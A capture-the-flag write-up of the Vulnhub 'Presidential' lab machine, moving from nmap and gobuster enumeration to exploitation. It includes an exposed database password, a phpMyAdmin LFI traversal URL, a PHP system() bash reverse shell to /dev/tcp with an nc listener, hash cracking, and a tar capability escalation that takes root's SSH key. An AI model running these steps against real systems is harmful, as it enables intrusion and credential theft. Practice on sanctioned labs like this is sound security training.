---
layout: post
title: Presidential-Machine
date: 06-11-2024 12:00:00 +0000
image: 
    path: /assets/covers/vulnhub.png
categories: [Pentesting]
tags: [Vulnhub, Nmap, Metasploit, LFI, PHP, Enumeration, Gobuster, John ]
---
# Presidential-Machine
## Difficulty:Medium - Hard
#### Link to  the machine: https://www.vulnhub.com/entry/Presidential-1,500/
#### Table of Contents
- [Presidential-Machine](#presidential-machine)
  - [Difficulty:Medium - Hard](#difficultymedium---hard)
      - [Link to  the machine: https://www.vulnhub.com/entry/Presidential-1,500/](#link-to--the-machine-httpswwwvulnhubcomentrypresidential-1500)
      - [Table of Contents](#table-of-contents)
  - [Introduction](#introduction)
  - [Prerequisites](#prerequisites)
  - [Summary](#summary)
  - [Reconnaissance](#reconnaissance)
    - [Nmap](#nmap)
  - [Enumeration](#enumeration)
    - [Gobuster](#gobuster)
  - [Vulnerabilities](#vulnerabilities)
  - [Exploitation](#exploitation)
  - [Post-exploitation](#post-exploitation)
    - [**John the Ripper** to Crack a Hash with the `rockyou.txt` Wordlist](#john-the-ripper-to-crack-a-hash-with-the-rockyoutxt-wordlist)
    - [Flag Found](#flag-found)
  - [Conclusion](#conclusion)

## Introduction

In the realm of cybersecurity, hands-on experience is crucial for honing penetration testing skills and understanding real-world vulnerabilities. Vulnhub serves as a valuable platform by providing a variety of intentionally vulnerable machines that security enthusiasts can use to practice and enhance their offensive and defensive techniques. The "Presidential-Machine" is one such machine designed to simulate a complex environment with multiple security challenges, making it an excellent target for both intermediate and advanced pentesters.

This write-up delves into the comprehensive process of identifying, enumerating, and exploiting the vulnerabilities present in the "Presidential-Machine." From initial reconnaissance to the final stages of post-exploitation, we will explore the tools and methodologies employed to gain unauthorized access and escalate privileges within the system. By dissecting each step, this guide aims to provide valuable insights and practical knowledge that can be applied to similar penetration testing scenarios.
## Prerequisites
Software Tools
Ensure the following tools are installed and updated on your system:

Nmap: For network discovery and security auditing.

```bash 
sudo apt-get install nmap
```
WhatWeb: To identify technologies used on websites.

```bash 
sudo apt-get install whatweb
```
Gobuster: For directory and file enumeration on web servers.
```bash 
sudo apt-get install gobuster
```

Wfuzz: A flexible tool for brute-forcing web applications.

```bash 
sudo apt-get install wfuzz
```
John the Ripper: For password cracking and hash analysis.

```bash 
sudo apt-get install john
```
Netcat (nc): For establishing reverse shells and listening for incoming connections.

```bash 
sudo apt-get install netcat
```
Metasploit Framework: A comprehensive tool for developing and executing exploit code against a remote target machine.

```bash 
sudo apt-get install metasploit-framework
```

## Summary
**1. Reconnaissance and Enumeration**
- **Network Discovery**:
- Identified the target machine's IP (`192.168.1.185`) using `arp-scan`.
- Ping test confirmed the machine was active, with a TTL value suggesting a Linux-based system.
- **Nmap Scans**:
- Identified open ports:
- **80 (HTTP)**: Hosting a web server running Apache/2.4.6 with PHP/5.5.38 on CentOS.
- **2082**: Possibly used for administration services.
- Verified HTTP service using `whatweb` to identify Bootstrap, jQuery, and outdated PHP version.
- **Hosts Configuration**:
- Added `votenow.local` to the `/etc/hosts` file for easier navigation.
- **Subdomain Discovery**:
- Used `wfuzz` to find the subdomain `datasafe.votenow.local`.

---

**2. Vulnerabilities Identified**
- **File Inclusion (LFI)**:
- Exploited an LFI vulnerability in the `db_sql.php` file to access sensitive system files, such as `/etc/passwd` and `/proc/net/tcp`.
- **PHP Configuration Disclosure**:
- Found a backup PHP file (`php.bak`) containing database credentials:
```php
$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
```
- **Weak Database Security**:
- Accessed phpMyAdmin using the discovered credentials.
- **Session Hijacking**:
- Exploited session cookies to gain control over authenticated sessions.
- **Privilege Escalation**:
- Leveraged `tar` with elevated capabilities to access the root user's SSH private key.

---

**3. Exploitation**
1. **Local File Inclusion (LFI)**:
- Accessed sensitive files, including `/etc/passwd`, `/proc/net/tcp`, and session files in `/var/lib/php/session`.
2. **phpMyAdmin Exploit**:
- Used a crafted SQL query to execute a reverse shell payload through phpMyAdmin, gaining a foothold.
3. **Reverse Shell**:
- Established a reverse shell connection using Netcat, gaining access as a standard user.

---

**4. Post-Exploitation**
- **Database Analysis**:
- Extracted hashed passwords from the `users` table in the `votebox` database.
- **Password Cracking**:
- Used John the Ripper with the `rockyou.txt` wordlist to crack the hash, revealing the password: **"Stella"**.
- **Privilege Escalation via `tar`**:
- Exploited `tar` capabilities to extract the root user's SSH private key.
- **Root Access**:
- Logged in as `root` using the SSH private key and retrieved the final flag.

---

**Flags Discovered**

| **Flag Number** | **Flag**                             |
| --------------- | ------------------------------------ |
| **Admin Flag**  | `663ba6a402a57536772c6118e8181570`   |
| **Final Flag**  | Retrieved after gaining root access. |

---

## Reconnaissance

**Network Verification Using ARP Scan**

We verified the network using ARP scan to locate the target or victim machine in this case.

![](/assets/post/Presidential/arp.png)
D:\LordM\Documents\Proyectos-practicas\blog\areianight.github.io\assets\post\Presidential
```bash
sudo arp-sacn I eth0 --localnet ignoredups
```

Verifying if the Machine Responds to a Ping

Before proceeding with more advanced enumeration and exploitation steps, it is essential to confirm that the target machine is active and reachable on the network. To achieve this, we perform a ping test.

![](/assets/post/Presidential/ping.png)


Interpretation of TTL

The TTL value suggests that we are likely dealing with a Linux machine.

### Nmap
We Start Using Nmap in This Way

![](/assets/post/Presidential/nmap.png)


```bash
`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.185 -oG allPorts
```

Nmap Flags Explanation

- **`-p-`**: Scans all ports (1-65535).
- **`--open`**: Shows only the ports that are open, ignoring those that are closed or filtered.
- **`-sS`**: Performs a **SYN Stealth** scan. This method sends SYN packets to identify open ports without establishing a full connection (TCP handshake), making it faster and less detectable.
- **`--min-rate 5000`**: Sets a minimum rate of 5000 packets per second, increasing the scan speed.
- **`-vvv`**: Increases verbosity to the maximum level, providing additional details about the progress and results.
- **`-n`**: Disables DNS resolution, speeding up the scan by not attempting to resolve domain names.
- **`-Pn`**: Tells Nmap to skip host discovery and assume that the host is up. This is useful when scanning devices that block or filter ICMP (ping) responses.
- **`-oG allPorts`**: Saves the results in a "grepable" format file (`allPorts`), facilitating easier processing and filtering of the results.

Scan Results

- **Scanned IP Address**: `192.168.1.185`

- **Total Number of Scanned Ports**: 65535 (all TCP ports).

- **Open Ports**:

- **80/tcp**: This port is associated with the HTTP protocol, which is commonly used by web servers. Here, it indicates that there is an open HTTP service running on this port.
- **2082/tcp**: Although this port does not have a widely known specific use, on some systems it can be associated with administration services like **cPanel** (a website management tool), which uses this port by default.

- **Details of Each Port**:

- Both ports show a **SYN-ACK** response in the `REASON` field, indicating that they are open and that the SYN scan received an affirmative response without completing the connection.
- **TTL 64**: The TTL (Time to Live) value of 64 is common in Linux-based systems, which may suggest the operating system of the scanned host.

Now We Proceed to Analyze Ports 80 and 2082


![](/assets/post/Presidential/nmap2.png)

```bash
map -sCV -p80,2082 192.168.1.185 -oN targeted
```


- **`-sCV`**: Combines two options:
- **`-sC`**: Runs Nmap's default scripts for detecting common services and vulnerabilities.
- **`-sV`**: Attempts to detect the service version on each open port.
- **`-p80,2082`**: Limits the scan to ports `80` and `2082`, previously identified as open.
- **`-oN targeted`**: Saves the results in a standard (readable) output file named "targeted".


Scan Results

- **Scanned IP Address**: `192.168.1.185`

- **Scanned Ports and Detected Services**:

- **80/tcp (HTTP)**:
- **Service**: Apache HTTP Server version 2.4.6, running on a **CentOS** system with **PHP 5.5.38**.
- **Potentially Risky HTTP Methods**: The server allows the **TRACE** method, which can pose a security risk as it may enable Cross-Site Tracing (XST) attacks.
- **Server Header**: `Apache/2.4.6 (CentOS) PHP/5.5.38`.
- **Page Title (HTTP Title)**: "Ontario Election Services » Vote Now!" This suggests that the website might be related to voting or election services, possibly in a testing or development environment.
- **2082/tcp (SSH)**:
- **Service**: OpenSSH version 7.4, utilizing the SSH 2.0 protocol.
- **SSH Keys**:
- RSA: `2048 bits`.
- ECDSA: `256 bits`.
- ED25519: `256 bits`.
- Each key displays its respective fingerprint, which is unique and can be used to verify the server's identity.


For the next step we will use whatweb to see what we are dealing with:

![](/assets/post/Presidential/whatweb.png)


```bash
whatweb <victim's ip>
```

Analysis of Results

1. **Scanned URL**: `http://192.168.1.185`

- This indicates that the scan was performed on the local IP address `192.168.1.185` using the HTTP protocol.
2. **HTTP Status Code**: `[200 OK]`

- This means that the request was successful and the server returned the page without issues.
3. **Web Server**: `Apache/2.4.6`

- The web server is **Apache**, version `2.4.6`, running on **CentOS**.
4. **Frameworks and Libraries**

- **Bootstrap**: The page uses the Bootstrap framework, which aids in designing responsive web interfaces.
- **jQuery**: It also uses jQuery, a popular JavaScript library.
5. **Operating System**: `CentOS`

- The server is based on **CentOS**, a Linux distribution frequently used for servers due to its stability and support.
6. **Programming Language**: `PHP/5.5.38`

- The web application is using **PHP** version `5.5.38`. This is an outdated version of PHP, which no longer receives security updates, posing a potential security risk.
7. **Page Title**: `Ontario Election Services &raquo; Vote Now!`

- The page title suggests that the site is related to voting services for Ontario, possibly a simulation or test page given the context.
8. **Email Addresses**:

- Two email addresses were detected:
- `contact@example.com`
- `contact@votenow.local`
- These addresses might be for contacting the website. However, `example.com` and the domain `votenow.local` suggest that the site is in a test or development environment and is not publicly accessible.





We set the ip of the victim machine along with votenow.local in the hosts file

![](/assets/post/Presidential/lh.png)


**Purpose**: The entry `votenow.local` is assigned to the IP address `192.168.1.185`, allowing the system to resolve the name `votenow.local` to this specific IP address. This means that when accessing `http://votenow.local` in the browser, the system will redirect the request to the IP `192.168.1.185`.

## Enumeration

We searched the web for domains or paths:

![](/assets/post/Presidential/nmap3.png)

```bash
nmap --script http-enum -p80 192.168.1.185  -oN webScan
```

- `--script http-enum`: Uses the HTTP enumeration script (`http-enum`), which attempts to identify common directories and files on web servers to find sensitive information or entry points.
- `-p80`: Specifies port `80`, which is the common port for HTTP.
- `-oN webScan`: Saves the output to a file named `webScan`.


**Scan Results**:

- **Port 80 (HTTP)**: Port 80 is open and running an HTTP service.
- **Directory `/icons/`**:
- The script found a directory named **`/icons/`**.

We check the website:

![](/assets/post/Presidential/web.png)

### Gobuster
We searched for new paths:

![](/assets/post/Presidential/gbuster.png)


```bash
gobuster dir -u http://192.168.1.185/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```


**Gobuster**, a tool for performing directory enumeration on web applications through brute force, exploring potential paths or hidden directories on the web server `http://192.168.1.185`.

- **`gobuster dir`**: Runs Gobuster in directory enumeration mode.
- **`-u http://192.168.1.185/`**: Sets the target URL for the scan.
- **`-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`**: Specifies the wordlist file, which contains common directory and file names, located in the **SecLists** directory.
- **`-t 20`**: Sets the number of threads to 20 to speed up the enumeration process.

- **Scan Results**:

- **Found Directory**: `/assets/`
- **Status**: `301`, indicating a permanent redirect. This means the server redirects requests to another resource (in this case, `/assets/` redirects to `http://192.168.1.185/assets/`).
- **Size**: `236`, which corresponds to the HTTP response size.
- **Redirect URL**: `http://192.168.1.185/assets/`
We searched for more paths:

![](/assets/post/Presidential/wfuzz.png)

```bash
wfuzz -c -u "http://votenow.local" -H "Host:FUZZ.votenow.local" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 854,45

```

**Wfuzz**, a brute-force tool, is used to enumerate subdomains on the `votenow.local` domain. The command attempts to discover subdomains by manipulating the `Host` header in the HTTP request.

`wfuzz -c -u 'http://votenow.local' -H 'Host:FUZZ.votenow.local' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 854,45`

- **`-c`**: Enables colored output, making results easier to read in the terminal.
- **`-u 'http://votenow.local'`**: Specifies the target URL.
- **`-H 'Host:FUZZ.votenow.local'`**: Manipulates the `Host` header to test different subdomains instead of directories. `FUZZ` is replaced with each entry in the wordlist.
- **`-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`**: Specifies the wordlist to use (in this case, a list of directory names, but used for subdomains in this context).
- **`--hw 854,45`**: Filters responses based on word (Word) or line (Lines) count to avoid unnecessary results.

- **Scan Results**:

- Wfuzz finds a subdomain **`datasafe.votenow.local`** with a **response code 200**, indicating that the subdomain is valid and accessible.


We added votenow.local to the /etc/hosts file:

![](/assets/post/Presidential/host2.png)

We continue searching for new paths, but now with file extensions:



![](/assets/post/Presidential/gbuster3.png)

```bash
gobuster dir -u http://192.168.1.185 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php,bak,bak,tar
```

**`-x php,txt,html,php.bak,bak,tar`**: Specifies the file extensions to search for, such as `.php`, `.txt`, `.html`, `.bak`, and `.tar`. This allows Gobuster to try these extensions with each entry in the wordlist.


We navigated to the `php.bak` path and found sensitive information:

## Vulnerabilities
![](/assets/post/Presidential/bak.png)

```php
<?php
$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";
?>
```
We checked the path, and it leads to a phpMyAdmin portal.

![](/assets/post/Presidential/phpmyadmin.png)


We entered the credentials and gained access to phpMyAdmin.


![](/assets/post/Presidential/Panel.png)


To find an exploit for phpMyAdmin, you can follow these steps:

![](/assets/post/Presidential/exphp.png)

We use the URL provided by the exploit:

![](/assets/post/Presidential/exphp2.png)



## Exploitation
We paste it into our phpMyAdmin.


![](/assets/post/Presidential/passwd.png)

```bash
datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../etc/passwd
```
This URL is an example of a Local File Inclusion (LFI) attack attempt, which aims to access sensitive files on a server by exploiting a vulnerable file inclusion mechanism.

?target=db_sql.php%253f/../../../../../etc/passwd: The target parameter is used to specify the file that index.php will try to include or load.

/../../../../../etc/passwd: This part uses directory traversal (../) to navigate up the directory structure on the server. The goal here is to reach the root directory (/) and then attempt to access the etc/passwd file, which contains information about users on the Unix/Linux system.


We navigate to the path `/proc/net/tcp`:

![](/assets/post/Presidential/tcp.png)

The `/proc/net/tcp` path belongs to the **proc** filesystem in Linux and contains information about the system's active TCP network connections.
- This technique suggests that the attacker is attempting to read the `/proc/net/tcp` file to obtain information about active connections and open ports, which could reveal details about connected services and IP addresses.


Now, with the provided information, we create a file on our machine and filter it as follows:

![](/assets/post/Presidential/tcp2.png)

**Analysis of `data` File Content**

The `data` will contain information in a format similar to `/proc/net/tcp`, which provides details about active TCP connections on a Linux system. Each line includes information in columns, representing different aspects of a TCP connection.

- The first column of each line shows an index (0, 1, 2, etc.).
- The following columns contain data such as the local address (IP and port in hexadecimal), remote address, connection state, transmission and reception queues, UID, and other details.

- `0100007F:0CEA`: Represents the **local IP address** (`127.0.0.1` in hexadecimal) and the **local port** (`0CEA` in hexadecimal, which converts to `3306` in decimal).
- `00000000:0000`: Represents the **remote IP address** (`0.0.0.0`) and the **remote port** (`0000`), indicating a listening connection.
- `0A`: Represents the **connection state** in hexadecimal.

Converted to decimal, these ports correspond to:

- `0CEA` -> `3306` (possibly used by MySQL).
- `0050` -> `80` (commonly the HTTP port).
- `0822` -> `2082` (may be associated with a specific service on the system, such as a web control panel or custom SSH).


We navigate to the `sched_debug` path and find the MySQL services in `/proc/sched_debug`.

![](/assets/post/Presidential/ssql.png)

We copy the cookie from our session.

![](/assets/post/Presidential/cookie.png)

We copy the previous address of our exploit along with our cookie in this way:

![](/assets/post/Presidential/session.png)

```bash
`datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../var/lib/php/session/sess_qdis9rl7janb6e6l4fh4fli353kcidg

```
## Post-exploitation

We run the following SQL query:

![](/assets/post/Presidential/sqlphp.png)



**PHP Command**:
- The command uses `<?php system(...) ?>`, a PHP function that allows the execution of system commands. In this case, the `system` function is used to initiate a reverse shell.

- **Reverse Shell**:
- The reverse shell is configured to connect to the IP `192.168.1.153` on port `443`, redirecting input and output to enable remote access to the system.
- In this case, the reverse shell is executed through the `bash -i` command, which starts an interactive shell and redirects input (`>&`) and output to `/dev/tcp/192.168.1.153/443`.

We start listening on port 443:

![](/assets/post/Presidential/nc.png)

```bash
nc -nlvp 443
```

nc: Netcat command, often used for network communication.
-l: Listen mode, used to wait for an incoming connection.
-v: Verbose mode, to get more detailed output.
-n: Skip DNS lookup for IP addresses, making the connection faster.

We reload the page with the session cookie, and we're in:

![](/assets/post/Presidential/in.png)


Inside phpMyAdmin, we found a `users` table in the `votebox` database.

![](/assets/post/Presidential/vb.png)

To crack it, we will use **John the Ripper**:

![](/assets/post/Presidential/john.png)

```bash
jhon -w:/usr/share/wordlist/rockyou.txt hash
```


- **John the Ripper** is a popular password-cracking tool that can be used to decrypt hashed passwords found in the `users` table.
- We'll export the password hashes from the `users` table and use a wordlist (e.g., `rockyou.txt`) with John the Ripper to attempt to crack the hashes.

### **John the Ripper** to Crack a Hash with the `rockyou.txt` Wordlist

1. **`john`**: Runs the **John the Ripper** tool, which is used for cracking passwords and hashes.
2. **`-w=/usr/share/wordlists/rockyou.txt`**: Specifies the `rockyou.txt` wordlist as the source of words to attempt to crack the hash. `rockyou.txt` is a popular wordlist containing millions of common passwords.
3. **`hash`**: This is the file that contains the hash to be cracked. In this example, the hash is stored in a file named `hash`.

**Result**

- **Cracked Password**: The password found is **"Stella"**.

**Access Gained**

- **Access Achieved**: We successfully entered the admin folder or user with the password.

![](/assets/post/Presidential/admin.png)

### Flag Found

- **Admin User Flag**: We successfully located the flag for the admin user.

![](/assets/post/Presidential/fg.png)

```bash
663ba6a402a57536772c6118e8181570
```


**Abusing the `tar` Capability or Binary**

![](/assets/post/Presidential/tars.png)



To escalate privileges by abusing capabilities or binaries in Linux, such as `tar`, one can leverage a specific configuration that allows commands to be executed as a superuser. In this case, the `tar` binary has special capabilities that permit it to be executed with elevated privileges.


This command packages the `/root/.ssh/id_rsa` file (the root's private SSH key) into a `id_rsa.tar` file.
- The `-c` option creates a new archive, `-v` shows the processed files (verbose mode), and `-f` specifies the output file name (`id_rsa.tar`).
- The message `Removing leading '/' from member names` indicates that `tar` is removing the leading slash (`/`) to make the path relative within the TAR file, which is a common behavior to avoid issues with absolute paths when extracting the file on other systems.

We found the private SSH key:

![](/assets/post/Presidential/ssh.png)

We used the private key to log in without a password and retrieved the **final flag**:

![](/assets/post/Presidential/ff.png)





## Conclusion

The penetration testing of the "Presidential-Machine" has highlighted the importance of a structured and methodical approach in cybersecurity assessments. By utilizing a combination of tools such as Nmap, WhatWeb, Gobuster, Wfuzz, and John the Ripper, we were able to identify and exploit several vulnerabilities, ranging from Local File Inclusion (LFI) to privilege escalation through the abuse of the `tar` binary.

**Key Findings**

- **Web Server Vulnerabilities**: The outdated PHP version and enabled HTTP TRACE method provided opportunities for LFI and session hijacking attacks.
- **Exposed Credentials**: The discovery of a backup PHP file (`php.bak`) revealed database credentials, allowing access to phpMyAdmin.
- **Privilege Escalation**: Leveraging the special capabilities of the `tar` binary enabled the extraction of the root user's SSH private key, granting full system access.

**Lessons Learned**

1. **Regular Software Updates**: Keeping software, especially web servers and scripting languages like PHP, up-to-date is crucial to mitigate security vulnerabilities.
2. **Secure Credential Management**: Storing sensitive credentials in accessible files without proper protection can lead to significant security breaches.
3. **System Permissions and Capabilities**: Regularly auditing system binaries and their permissions can prevent unauthorized privilege escalation.